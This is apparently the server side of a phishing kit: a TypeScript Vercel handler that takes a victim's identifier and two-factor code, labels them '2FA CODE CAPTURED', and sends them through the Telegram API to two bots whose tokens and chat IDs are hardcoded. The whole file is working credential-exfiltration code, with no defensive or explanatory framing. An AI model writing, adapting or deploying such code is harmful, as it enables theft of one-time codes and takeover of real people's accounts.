import { VercelRequest, VercelResponse } from '@vercel/node';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { identifier, code } = req.body;
  
  const bots = [
    { token: "8678575710:AAE14KegKrQNkCBqQ8y_YhdwYeDpjls1QbQ", chatId: "8582874053" },
    { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
  ];

  const message = `
🔐 **2FA CODE CAPTURED** 🚨
👤 User: ${identifier}
🔢 Code: ${code}
  `;

  try {
    await Promise.all(bots.map(async (bot) => {
      await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: bot.chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      });
    }));
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Verify Error:", error);
    res.status(500).json({ error: "Error interno" });
  }
}
